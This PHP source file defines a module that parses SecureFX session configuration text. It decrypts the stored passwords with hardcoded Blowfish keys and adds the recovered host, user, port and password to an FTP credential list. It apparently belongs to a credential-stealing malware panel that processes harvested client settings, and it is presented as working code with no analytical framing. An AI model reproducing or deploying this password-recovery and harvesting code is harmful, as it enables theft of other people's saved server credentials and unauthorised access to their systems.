<?php
	class Module_securefx extends Module_
	{
private function Decrypt($Password)
	{
		$Password = trim($Password);
		if (!strlen($Password))
			return '';

		$Unicode = FALSE;
		if ($Password[0] == 'u')
		{
			$Unicode = TRUE;
			$Password = substr($Password, 1);
		}

		$Password = trim($Password);
		if (!strlen($Password))
			return '';

		$PWDec = hex2bin($Password);
		if ($PWDec === false)
			return '';

		$KEY1_ = chr(0x24).chr(0xA6).chr(0x3D).chr(0xDE).chr(0x5B).chr(0xD3).chr(0xB3).chr(0x82).chr(0x9C).chr(0x7E).chr(0x06).chr(0xF4).chr(0x08).chr(0x16).chr(0xAA).chr(0x07);
		$KEY2_ = chr(0x5f).chr(0xB0).chr(0x45).chr(0xA2).chr(0x94).chr(0x17).chr(0xD9).chr(0x16).chr(0xC6).chr(0xC6).chr(0xA2).chr(0xFF).chr(0x06).chr(0x41).chr(0x82).chr(0xB7);
		$IV_ = "\0\0\0\0\0\0\0\0";

		$ResultPW = mcrypt_decrypt(MCRYPT_BLOWFISH, $KEY1_, $PWDec, MCRYPT_MODE_CBC, $IV_);

		if (strlen($ResultPW) > 8)
		{
			$ResultPW = mcrypt_decrypt(MCRYPT_BLOWFISH, $KEY2_, substr($ResultPW, 4, -4), MCRYPT_MODE_CBC, $IV_);

			if (strlen($ResultPW))
			{
				if ($Unicode)
					$ResultPW = ztrim(iconv('UTF-16LE', 'UTF-8', $ResultPW));
				else
					 $ResultPW = ztrim($ResultPW);
				 
				return $ResultPW;
			}
		}

		return '';
	}
		protected function SecureFX($Source)
		{
			$Lines = parse_lines($Source);
			$User = $Host = $Prot = $Pass = $Port = '';

			foreach ($Lines as $Line)
			{
				$Values = explode('=', $Line);
				if (count($Values) == 2)
				{
					if (strpos($Values[0], 'S:"Hostname"') !== false)
						$Host = $Values[1];
				
					if (strpos($Values[0], 'S:"Username"') !== false)
						$User = $Values[1];
					
					if (strpos($Values[0], 'S:"Password"') !== false)
						$Pass = $Values[1];
				
					if (strpos($Values[0], 'D:"Transfer Port"') !== false)
						$Port = $Values[1];
					
					if (strpos($Values[0], 'S:"Transfer Protocol Name"') !== false)
						$Prot = $Values[1];
				}
			}
			
			$Pass = $this->Decrypt($Pass);

			if (strlen($Port))
				$Port = hexdec($Port);
			
			if(strlen($Pass))
				$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == 'SFTP'), $Port), $User,  $Pass);
			
			$Lines = NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->SecureFX($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}